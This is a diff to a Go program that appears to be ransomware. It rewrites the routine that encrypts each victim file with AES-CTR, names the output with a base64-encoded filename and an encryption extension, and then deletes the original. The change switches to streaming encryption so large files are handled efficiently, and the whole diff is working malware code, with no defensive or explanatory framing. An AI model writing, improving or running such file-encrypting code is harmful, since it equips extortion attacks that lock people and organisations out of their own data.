@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -192,12 +191,13 @@ func encryptFiles() {
 
 // Encrypt a single file
 func encryptFile(file cmd.File, enckey string) {
-	// Read the file content
-	content, err := ioutil.ReadFile(file.Path)
+	// Open the file
+	inFile, err := os.Open(file.Path)
 	if err != nil {
 		log.Println(err)
 		return
 	}
+	defer inFile.Close()
 
 	// Create a 128 bits cipher.Block for AES-256
 	block, err := aes.NewCipher([]byte(enckey))
@@ -207,32 +207,41 @@ func encryptFile(file cmd.File, enckey string) {
 	}
 
 	// The IV needs to be unique, but not secure
-	ciphertext := make([]byte, aes.BlockSize+len(content))
-	iv := ciphertext[:aes.BlockSize]
+	iv := make([]byte, aes.BlockSize)
 	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
 		log.Println(err)
 		return
 	}
+
+	// Get a stream for encrypt/decrypt in counter mode
 	stream := cipher.NewCTR(block, iv)
-	stream.XORKeyStream(ciphertext[aes.BlockSize:], content)
 
 	// Replace the file name by the base64 equivalent
 	newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
 
 	// Create/Open the output file
-	outFile, err := os.OpenFile(newpath+cmd.EncryptionExtension, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
+	outFile, err := os.OpenFile(newpath+cmd.EncryptionExtension, os.O_WRONLY|os.O_CREATE|os.O_APPEND|os.O_TRUNC, 0600)
 	if err != nil {
 		log.Println(err)
 		return
 	}
 	defer outFile.Close()
 
-	// Copy the encrypted content to a new file
-	if _, err = io.Copy(outFile, bytes.NewReader(ciphertext)); err != nil {
+	// Write the Initialization Vector (iv) as the first bytes
+	// of the encrypted file
+	outFile.Write(iv)
+
+	// Open a stream to encrypt and write to output file
+	writer := &cipher.StreamWriter{S: stream, W: outFile}
+
+	// Copy the input file to the output file, encrypting as we go.
+	if _, err = io.Copy(writer, inFile); err != nil {
 		log.Println(err)
 		return
 	}
 
+	// Here we need to close the file manually to be able to delete then
+	inFile.Close()
 	err = os.Remove(file.Path)
 	if err != nil {
 		log.Println("Cannot delete original file, skipping...")
